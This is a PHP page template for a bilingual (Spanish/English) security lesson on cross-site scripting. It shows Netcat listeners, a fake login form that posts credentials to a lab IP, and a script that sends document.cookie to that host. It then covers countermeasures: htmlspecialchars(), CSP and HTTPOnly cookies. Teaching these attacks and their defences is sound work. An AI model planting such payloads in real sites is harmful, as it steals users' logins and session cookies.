<?php
require_once __DIR__ . '/../bootstrap.php';
$pageTitle    = $lang==='es' ? 'XSS: Captura de Cookies y Formularios Falsos — CyberEscudo' : 'XSS: Cookie Theft & Fake Forms — CyberEscudo';
$contentTitle = $lang==='es' ? 'XSS: Captura de Cookies y Formularios Falsos' : 'XSS: Cookie Theft & Fake Forms';
$contentDate  = '2022-01-01';
$contentTags  = ['XSS','Cross-Site Scripting','Netcat','Cookies','PHP'];
ob_start();
if ($lang==='es'): ?>
<div class="prose">
  <p>Práctica sobre ataques <strong>Cross-Site Scripting (XSS)</strong>: envío de credenciales a un listener de Netcat, captura de cookies de sesión y uso de <code>htmlspecialchars()</code> como contramedida.</p>

  <h2>1. Envío de credenciales con XSS + Netcat</h2>
  <p>Ponemos Netcat en escucha en el puerto deseado:</p>
  <pre><code>nc -lvp 1337</code></pre>
  <p>Inyectamos el siguiente payload XSS en un campo vulnerable. El formulario falso envía las credenciales a nuestra IP:</p>
  <pre><code>&lt;script&gt;alert('Por favor, inicia sesion para continuar')&lt;/script&gt;
&lt;h3&gt;Para continuar navegando, inicie sesión&lt;/h3&gt;
&lt;form action="http://10.0.2.15:1337"&gt;
  Username:&lt;br&gt;
  &lt;input type="text" name="username"&gt;&lt;br&gt;
  Password:&lt;br&gt;
  &lt;input type="password" name="password"&gt;&lt;br&gt;
  &lt;input type="submit" value="Login"&gt;
&lt;/form&gt;</code></pre>
  <p>Con la API de <em>Speech Synthesis</em> podemos hacer el engaño más convincente añadiendo voz al alert.</p>

  <h2>2. Captura de cookies de sesión</h2>
  <p>La función <code>document.cookie</code> devuelve todas las cookies del navegador separadas por punto y coma. El siguiente payload las exfiltra hacia nuestro servidor:</p>
  <pre><code>&lt;script&gt;
img = new Image();
img.src = "http://10.0.2.15:800/a.php?" + document.cookie;
&lt;/script&gt;</code></pre>
  <p>En el listener (<code>nc -lvp 800</code>) recibiremos la petición GET con las cookies en la query string.</p>

  <h2>3. Contramedida: htmlspecialchars()</h2>
  <p><code>htmlspecialchars()</code> convierte los caracteres especiales en entidades HTML, neutralizando el script antes de que el navegador lo interprete:</p>
  <pre><code>&lt;?php
// Antes de mostrar cualquier entrada de usuario:
$input = htmlspecialchars($_POST['comentario'], ENT_QUOTES, 'UTF-8');
echo $input;
?&gt;</code></pre>
  <p>Caracteres que escapa: <code>&lt;</code> → <code>&amp;lt;</code>, <code>&gt;</code> → <code>&amp;gt;</code>, <code>"</code> → <code>&amp;quot;</code>, <code>'</code> → <code>&amp;#039;</code>.</p>
  <p>Resultado: aunque el atacante inyecte <code>&lt;script&gt;...&lt;/script&gt;</code>, el navegador lo renderiza como texto plano en lugar de ejecutarlo.</p>

  <h2>Otras contramedidas</h2>
  <ul>
    <li><strong>Content Security Policy (CSP)</strong>: cabecera HTTP que restringe las fuentes desde las que se puede cargar JavaScript.</li>
    <li><strong>HTTPOnly en cookies</strong>: marca las cookies como no accesibles desde JS (<code>session.cookie_httponly = On</code> en PHP).</li>
    <li><strong>Validación de entrada</strong>: lista blanca de caracteres permitidos en cada campo del formulario.</li>
  </ul>
</div>
<?php else: ?>
<div class="prose">
  <p>Practice exercises on <strong>XSS</strong> attacks: credential theft with Netcat, session cookie exfiltration and defense with <code>htmlspecialchars()</code>.</p>

  <h2>1. Credential Theft via XSS + Netcat</h2>
  <pre><code">nc -lvp 1337</code></pre>
  <pre><code>&lt;h3&gt;Session expired — please sign in again&lt;/h3&gt;
&lt;form action="http://10.0.2.15:1337"&gt;
  Username: &lt;input type="text" name="username"&gt;
  Password: &lt;input type="password" name="password"&gt;
  &lt;input type="submit" value="Log In"&gt;
&lt;/form&gt;</code></pre>

  <h2>2. Session Cookie Theft</h2>
  <pre><code>&lt;script&gt;img=new Image();img.src="http://10.0.2.15:800/a.php?"+document.cookie;&lt;/script&gt;</code></pre>

  <h2>3. Defense: htmlspecialchars()</h2>
  <pre><code>&lt;?php
$input = htmlspecialchars($_POST['comment'], ENT_QUOTES, 'UTF-8');
echo $input;
?&gt;</code></pre>
  <p>Characters escaped: <code>&lt;</code> becomes <code>&amp;lt;</code>, <code>&gt;</code> becomes <code>&amp;gt;</code>, quotes are encoded. The script tag renders as plain text instead of executing.</p>

  <h2>Additional Countermeasures</h2>
  <ul>
    <li><strong>Content Security Policy (CSP):</strong> restricts JavaScript sources via HTTP header.</li>
    <li><strong>HTTPOnly cookies:</strong> blocks JavaScript access to session cookies.</li>
    <li><strong>Input validation:</strong> whitelist of allowed characters per field.</li>
  </ul>
</div>
<?php endif;
$contentBody=ob_get_clean();
require __DIR__.'/../templates/content-page.php';
